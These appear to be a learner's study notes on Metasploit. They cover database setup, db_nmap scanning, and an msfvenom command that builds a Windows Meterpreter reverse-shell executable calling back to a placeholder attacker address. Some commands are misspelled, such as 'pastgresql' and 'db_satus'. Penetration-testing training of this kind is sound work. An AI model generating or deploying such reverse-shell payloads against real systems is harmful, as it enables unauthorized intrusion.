- How to scan target systems using Metasploit.
- How to use the Metasploit database feature.
- How to use Metasploit to conduct a vulnerability scan.
- How to use Metasploit to exploit vulnerable services on target systems.
- How `msfvenom` can be used to create payloads and obtain a Meterpreter session on the target system.

### The `Metasploit` Database

- start `postgreSQL` database, 
  ```zsh
  systemctl start pastgresql
```
- initializing metasploit database, 
  ```zsh
  msfdb init
```
- launch `msfconsole`
- check database status using `db_satus` 
- list available workspaces using `workspace`
- add or delete workspace using `-a`, `-d` options 
- running `nmap` using `db` saves all the results to the database
  ```zsh
  db_nmap -sV -p- Machine_ip
```
then see the result you can run `hosts` and `service` commands 
### `msfvenom`
- is a standalone payload generator, a combination of `msfpayload` and `msfencode`
- handlers are components to receive/accept the incoming connection generated by msfvenom payload.
- msfvenom can be used to create a payloads in different formats, based on machine's operation system, installed interpreter, installed webserver and etc.
- for instance, to generate payload for windows machine one can do this
  ```zsh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
